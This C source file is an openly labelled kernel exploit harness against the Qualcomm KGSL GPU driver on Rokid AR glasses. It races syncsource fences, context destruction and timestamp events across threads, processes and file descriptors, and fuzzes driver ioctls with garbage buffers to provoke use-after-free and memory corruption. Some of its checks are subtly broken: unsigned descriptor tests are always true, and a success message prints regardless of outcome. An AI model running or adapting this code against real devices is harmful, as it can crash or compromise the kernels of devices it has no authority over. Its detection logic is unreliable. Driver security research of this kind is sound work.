/*
 * KGSL Timestamp/Fence Racing Exploit
 * ====================================
 *
 * Research KGSL's timestamp and fence mechanisms for race conditions.
 * These are used for GPU command synchronization and often have UAF issues.
 *
 * Attack vectors:
 * 1. Fence signaling race conditions
 * 2. Timeline destruction during waiter operations
 * 3. Event memory corruption
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -pthread -o kgsl_fence_race kgsl_fence_race.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <sched.h>

// ============================================================================
// KGSL IOCTL Definitions
// ============================================================================

#define KGSL_IOC_MAGIC 0x09

// IOCTL commands
#define IOCTL_KGSL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_KGSL_DEVICE_GETPROPERTY 0xc0100902
#define IOCTL_KGSL_TIMESTAMP_EVENT 0xc010090e
#define IOCTL_KGSL_CMDSTREAM_FREEMEMONTIMESTAMP 0xc010090f
#define IOCTL_KGSL_DRAWCTXT_CREATE 0xc0100913
#define IOCTL_KGSL_DRAWCTXT_DESTROY 0x40080914
#define IOCTL_KGSL_GPU_COMMAND 0xc0580940
#define IOCTL_KGSL_GPUOBJ_SYNC 0xc0180956
#define IOCTL_KGSL_SYNCSOURCE_CREATE 0xc0080930
#define IOCTL_KGSL_SYNCSOURCE_DESTROY 0x40040931
#define IOCTL_KGSL_SYNCSOURCE_CREATE_FENCE 0xc0180932
#define IOCTL_KGSL_SYNCSOURCE_SIGNAL_FENCE 0x40040933

// Property constants
#define KGSL_PROP_DEVICE_INFO 0x1
#define KGSL_PROP_DEVICE_SHADOW 0x2
#define KGSL_PROP_VERSION 0x29

// Timestamp event types
#define KGSL_TIMESTAMP_EVENT_FENCE 1

// Context flags
#define KGSL_CONTEXT_NO_FAULT_TOLERANCE 0x200

// ============================================================================
// Structures
// ============================================================================

struct gpumem_alloc_req
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

struct kgsl_device_getproperty
{
    uint32_t type;
    void *value;
    uint32_t sizebytes;
};

struct kgsl_drawctxt_create
{
    uint32_t flags;
    uint32_t drawctxt_id;
};

struct kgsl_drawctxt_destroy
{
    uint32_t drawctxt_id;
    uint32_t padding;
};

struct kgsl_syncsource_create
{
    uint32_t id;
    uint32_t padding;
};

struct kgsl_syncsource_create_fence
{
    uint32_t id;
    uint32_t padding;
    uint64_t fence_fd; // output
};

struct kgsl_syncsource_signal_fence
{
    uint32_t id;
};

struct kgsl_syncsource_destroy
{
    uint32_t id;
};

struct kgsl_timestamp_event
{
    int type; // event type
    uint32_t timestamp;
    uint32_t context_id;
    void *priv;
    uint32_t len;
    uint32_t padding;
};

struct kgsl_gpuobj_sync
{
    uint64_t objs; // array of sync objects
    uint32_t count;
    uint32_t op;
};

struct kgsl_gpuobj_sync_obj
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t op;
    uint32_t padding;
};

// ============================================================================
// Globals
// ============================================================================

static volatile int g_running = 1;
static volatile int g_race_detected = 0;
static volatile uint64_t g_iterations = 0;

static int kgsl_fd = -1;
static uint32_t context_id = 0;
static uint64_t gpu_alloc_addr = 0;
static void *gpu_map = NULL;

// ============================================================================
// Helper functions
// ============================================================================

static sigjmp_buf jmp_env;
static volatile sig_atomic_t sig_received = 0;

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

int safe_read64(void *ptr, uint64_t *out)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *out = *(volatile uint64_t *)ptr;
        return 0;
    }
    return -1;
}

void hexdump(const char *desc, const void *data, size_t size)
{
    const uint8_t *p = (const uint8_t *)data;
    printf("%s:\n", desc);
    for (size_t i = 0; i < size && i < 64; i++)
    {
        if (i % 32 == 0)
            printf("  ");
        printf("%02x", p[i]);
        if ((i + 1) % 32 == 0)
            printf("\n");
        else if ((i + 1) % 8 == 0)
            printf(" ");
    }
    if (size % 32 != 0)
        printf("\n");
}

// ============================================================================
// Test 1: Syncsource Fence Create/Destroy Race
// ============================================================================

struct fence_race_data
{
    int fd;
    uint32_t sync_id;
    volatile int *stop;
    volatile int *hits;
};

void *fence_create_thread(void *arg)
{
    struct fence_race_data *data = (struct fence_race_data *)arg;

    while (!*data->stop)
    {
        struct kgsl_syncsource_create_fence fence_req = {0};
        fence_req.id = data->sync_id;

        int ret = ioctl(data->fd, IOCTL_KGSL_SYNCSOURCE_CREATE_FENCE, &fence_req);
        if (ret == 0 && fence_req.fence_fd >= 0)
        {
            (*data->hits)++;
            close((int)fence_req.fence_fd);
        }
        sched_yield();
    }
    return NULL;
}

void *fence_signal_thread(void *arg)
{
    struct fence_race_data *data = (struct fence_race_data *)arg;

    while (!*data->stop)
    {
        struct kgsl_syncsource_signal_fence signal_req = {0};
        signal_req.id = data->sync_id;

        ioctl(data->fd, IOCTL_KGSL_SYNCSOURCE_SIGNAL_FENCE, &signal_req);
        sched_yield();
    }
    return NULL;
}

void *fence_destroy_thread(void *arg)
{
    struct fence_race_data *data = (struct fence_race_data *)arg;

    while (!*data->stop)
    {
        struct kgsl_syncsource_destroy destroy_req = {0};
        destroy_req.id = data->sync_id;

        ioctl(data->fd, IOCTL_KGSL_SYNCSOURCE_DESTROY, &destroy_req);

        // Recreate immediately
        struct kgsl_syncsource_create create_req = {0};
        ioctl(data->fd, IOCTL_KGSL_SYNCSOURCE_CREATE, &create_req);
        if (create_req.id > 0)
        {
            data->sync_id = create_req.id;
        }

        sched_yield();
    }
    return NULL;
}

void test_fence_race(void)
{
    printf("\n=== Test 1: Syncsource Fence Create/Destroy Race ===\n");

    // Create initial syncsource
    struct kgsl_syncsource_create create_req = {0};
    if (ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_CREATE, &create_req) < 0)
    {
        printf("[-] Cannot create syncsource\n");
        return;
    }
    printf("[+] Created syncsource ID: %u\n", create_req.id);

    volatile int stop = 0;
    volatile int create_hits = 0;

    struct fence_race_data data = {
        .fd = kgsl_fd,
        .sync_id = create_req.id,
        .stop = &stop,
        .hits = &create_hits};

    pthread_t create_t, signal_t, destroy_t;

    pthread_create(&create_t, NULL, fence_create_thread, &data);
    pthread_create(&signal_t, NULL, fence_signal_thread, &data);
    pthread_create(&destroy_t, NULL, fence_destroy_thread, &data);

    usleep(200000); // 200ms
    stop = 1;

    pthread_join(create_t, NULL);
    pthread_join(signal_t, NULL);
    pthread_join(destroy_t, NULL);

    printf("[+] Fence create hits: %d\n", create_hits);

    // Cleanup
    struct kgsl_syncsource_destroy destroy_req = {0};
    destroy_req.id = data.sync_id;
    ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_DESTROY, &destroy_req);
}

// ============================================================================
// Test 2: Context Destroy During Timestamp Event
// ============================================================================

struct ctx_race_data
{
    int fd;
    uint32_t ctx_id;
    volatile int *stop;
    volatile int *event_count;
};

void *timestamp_event_thread(void *arg)
{
    struct ctx_race_data *data = (struct ctx_race_data *)arg;

    uint8_t priv_data[64] = {0};

    while (!*data->stop)
    {
        struct kgsl_timestamp_event event = {0};
        event.type = KGSL_TIMESTAMP_EVENT_FENCE;
        event.timestamp = 0xFFFFFFFF; // Trigger immediately
        event.context_id = data->ctx_id;
        event.priv = priv_data;
        event.len = sizeof(priv_data);

        int ret = ioctl(data->fd, IOCTL_KGSL_TIMESTAMP_EVENT, &event);
        if (ret == 0)
        {
            (*data->event_count)++;
        }
        sched_yield();
    }
    return NULL;
}

void *context_destroy_thread(void *arg)
{
    struct ctx_race_data *data = (struct ctx_race_data *)arg;

    while (!*data->stop)
    {
        struct kgsl_drawctxt_destroy destroy = {0};
        destroy.drawctxt_id = data->ctx_id;

        int ret = ioctl(data->fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);

        // Recreate
        if (ret == 0 || errno == EINVAL)
        {
            struct kgsl_drawctxt_create create = {0};
            create.flags = KGSL_CONTEXT_NO_FAULT_TOLERANCE;
            if (ioctl(data->fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create) == 0)
            {
                data->ctx_id = create.drawctxt_id;
            }
        }

        sched_yield();
    }
    return NULL;
}

void test_context_timestamp_race(void)
{
    printf("\n=== Test 2: Context Destroy During Timestamp Event ===\n");

    // Create context
    struct kgsl_drawctxt_create create = {0};
    create.flags = KGSL_CONTEXT_NO_FAULT_TOLERANCE;

    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create) < 0)
    {
        printf("[-] Cannot create context: %s\n", strerror(errno));
        return;
    }
    printf("[+] Created context ID: %u\n", create.drawctxt_id);

    volatile int stop = 0;
    volatile int event_count = 0;

    struct ctx_race_data data = {
        .fd = kgsl_fd,
        .ctx_id = create.drawctxt_id,
        .stop = &stop,
        .event_count = &event_count};

    pthread_t event_t, destroy_t;

    pthread_create(&event_t, NULL, timestamp_event_thread, &data);
    pthread_create(&destroy_t, NULL, context_destroy_thread, &data);

    usleep(200000); // 200ms
    stop = 1;

    pthread_join(event_t, NULL);
    pthread_join(destroy_t, NULL);

    printf("[+] Timestamp events registered: %d\n", event_count);

    // Cleanup
    struct kgsl_drawctxt_destroy destroy = {0};
    destroy.drawctxt_id = data.ctx_id;
    ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
}

// ============================================================================
// Test 3: GPU Object Sync Race
// ============================================================================

void test_gpuobj_sync_race(void)
{
    printf("\n=== Test 3: GPU Object Sync Race ===\n");

    // Allocate GPU memory
    struct gpumem_alloc_req alloc = {0};
    alloc.size = 0x10000;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
    {
        printf("[-] GPU alloc failed\n");
        return;
    }
    printf("[+] GPU allocation at 0x%lx\n", alloc.gpuaddr);

    // Map it
    uint64_t page_idx = (alloc.gpuaddr - 0x4000000000ULL) / 0x1000;
    uint64_t offset = (page_idx + 1) * 0x1000;

    void *ptr = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, kgsl_fd, offset);
    if (ptr == MAP_FAILED)
    {
        printf("[-] mmap failed\n");
        return;
    }
    printf("[+] Mapped at %p\n", ptr);

    // Try various sync operations
    struct kgsl_gpuobj_sync_obj sync_objs[8];
    for (int i = 0; i < 8; i++)
    {
        sync_objs[i].gpuaddr = alloc.gpuaddr;
        sync_objs[i].size = 0x1000;
        sync_objs[i].op = i; // Different sync operations
        sync_objs[i].padding = 0;
    }

    struct kgsl_gpuobj_sync sync = {0};
    sync.objs = (uint64_t)sync_objs;
    sync.count = 8;
    sync.op = 0;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_SYNC, &sync);
    printf("[*] gpuobj_sync returned: %d (errno=%d: %s)\n", ret, errno, strerror(errno));

    munmap(ptr, 0x10000);
}

// ============================================================================
// Test 4: Multi-FD Fence Race
// ============================================================================

void test_multi_fd_fence_race(void)
{
    printf("\n=== Test 4: Multi-FD Fence Race ===\n");

    int fd1 = open("/dev/kgsl-3d0", O_RDWR);
    int fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (fd1 < 0 || fd2 < 0)
    {
        printf("[-] Cannot open extra fds\n");
        return;
    }

    // Create syncsource on fd1
    struct kgsl_syncsource_create create = {0};
    if (ioctl(fd1, IOCTL_KGSL_SYNCSOURCE_CREATE, &create) < 0)
    {
        printf("[-] Syncsource create failed\n");
        close(fd1);
        close(fd2);
        return;
    }
    uint32_t sync_id = create.id;
    printf("[+] Syncsource on fd1: %u\n", sync_id);

    // Try to access it from fd2
    struct kgsl_syncsource_create_fence fence = {0};
    fence.id = sync_id;
    int ret = ioctl(fd2, IOCTL_KGSL_SYNCSOURCE_CREATE_FENCE, &fence);
    printf("[*] fd2 fence create on fd1's syncsource: ret=%d errno=%d\n", ret, errno);

    // Now race: close fd1 while fd2 tries to use the syncsource
    pid_t pid = fork();
    if (pid == 0)
    {
        // Child: spam fence operations on fd2
        for (int i = 0; i < 1000; i++)
        {
            struct kgsl_syncsource_create_fence f = {0};
            f.id = sync_id;
            ioctl(fd2, IOCTL_KGSL_SYNCSOURCE_CREATE_FENCE, &f);
            if (f.fence_fd >= 0)
                close((int)f.fence_fd);

            struct kgsl_syncsource_signal_fence s = {0};
            s.id = sync_id;
            ioctl(fd2, IOCTL_KGSL_SYNCSOURCE_SIGNAL_FENCE, &s);
        }
        _exit(0);
    }
    else if (pid > 0)
    {
        // Parent: close fd1
        usleep(1000); // Let child start
        close(fd1);
        printf("[+] fd1 closed, waiting for child...\n");

        int status;
        waitpid(pid, &status, 0);

        if (WIFSIGNALED(status))
        {
            printf("[!!!] Child crashed with signal %d!\n", WTERMSIG(status));
        }
        else
        {
            printf("[*] Child exited normally\n");
        }
    }

    close(fd2);
}

// ============================================================================
// Test 5: Timestamp Comparison Overflow
// ============================================================================

void test_timestamp_overflow(void)
{
    printf("\n=== Test 5: Timestamp Comparison Overflow ===\n");

    // Create context
    struct kgsl_drawctxt_create create = {0};
    create.flags = KGSL_CONTEXT_NO_FAULT_TOLERANCE;

    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create) < 0)
    {
        printf("[-] Context create failed\n");
        return;
    }
    printf("[+] Context: %u\n", create.drawctxt_id);

    // Try various timestamp values for comparison issues
    uint32_t test_timestamps[] = {
        0x00000000,
        0x7FFFFFFF,
        0x80000000,
        0xFFFFFFFF,
        0x80000001,
    };

    for (int i = 0; i < sizeof(test_timestamps) / sizeof(test_timestamps[0]); i++)
    {
        uint8_t priv[64] = {0};
        struct kgsl_timestamp_event event = {0};
        event.type = KGSL_TIMESTAMP_EVENT_FENCE;
        event.timestamp = test_timestamps[i];
        event.context_id = create.drawctxt_id;
        event.priv = priv;
        event.len = sizeof(priv);

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_TIMESTAMP_EVENT, &event);
        printf("  ts=0x%08x: ret=%d errno=%d\n", test_timestamps[i], ret, errno);
    }

    // Cleanup
    struct kgsl_drawctxt_destroy destroy = {0};
    destroy.drawctxt_id = create.drawctxt_id;
    ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &destroy);
}

// ============================================================================
// Test 6: IOCTL Fuzzing
// ============================================================================

void test_ioctl_fuzz(void)
{
    printf("\n=== Test 6: KGSL IOCTL Fuzzing ===\n");

    // Interesting KGSL IOCTLs to test
    uint32_t interesting_ioctls[] = {
        0xc0100902, // GETPROPERTY
        0xc018092f, // GPUMEM_ALLOC
        0xc0100913, // DRAWCTXT_CREATE
        0x40080914, // DRAWCTXT_DESTROY
        0xc010090e, // TIMESTAMP_EVENT
        0xc010090f, // FREEMEMONTIMESTAMP
        0xc0580940, // GPU_COMMAND
        0xc0180956, // GPUOBJ_SYNC
        0xc0080930, // SYNCSOURCE_CREATE
        0x40040931, // SYNCSOURCE_DESTROY
        0xc0180932, // SYNCSOURCE_CREATE_FENCE
        0x40040933, // SYNCSOURCE_SIGNAL_FENCE
    };

    uint8_t fuzz_buf[256];
    memset(fuzz_buf, 0x41, sizeof(fuzz_buf));

    printf("[*] Testing IOCTLs with garbage data...\n");

    for (int i = 0; i < sizeof(interesting_ioctls) / sizeof(interesting_ioctls[0]); i++)
    {
        // Reset buffer
        memset(fuzz_buf, 0x41, sizeof(fuzz_buf));

        errno = 0;
        int ret = ioctl(kgsl_fd, interesting_ioctls[i], fuzz_buf);

        // Check if kernel panicked by testing read
        uint64_t test_val;
        if (gpu_map && safe_read64(gpu_map, &test_val) < 0)
        {
            printf("[!!!] Kernel may have corrupted memory on ioctl 0x%x!\n",
                   interesting_ioctls[i]);
        }

        if (ret == 0)
        {
            printf("  0x%08x: SUCCESS with garbage! Check for corruption\n",
                   interesting_ioctls[i]);
        }
    }

    printf("[+] Fuzzing complete, system stable\n");
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Fence/Timestamp Racing Exploit                          ║\n");
    printf("║  Target: Rokid AR Glasses                                     ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] kgsl_fd = %d\n", kgsl_fd);

    // Make initial GPU allocation
    struct gpumem_alloc_req alloc = {0};
    alloc.size = 0x1000;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
    {
        printf("[-] Initial alloc failed\n");
        return 1;
    }
    gpu_alloc_addr = alloc.gpuaddr;
    printf("[+] Initial GPU allocation: 0x%lx\n", gpu_alloc_addr);

    // Map it
    uint64_t page_idx = (gpu_alloc_addr - 0x4000000000ULL) / 0x1000;
    uint64_t offset = (page_idx + 1) * 0x1000;
    gpu_map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, offset);
    if (gpu_map != MAP_FAILED)
    {
        printf("[+] GPU memory mapped at %p\n", gpu_map);
    }

    // Run tests
    test_fence_race();
    test_context_timestamp_race();
    test_gpuobj_sync_race();
    test_multi_fd_fence_race();
    test_timestamp_overflow();
    test_ioctl_fuzz();

    // Cleanup
    if (gpu_map != MAP_FAILED)
        munmap(gpu_map, 0x1000);
    close(kgsl_fd);

    printf("\n=== All Tests Complete ===\n");
    return 0;
}
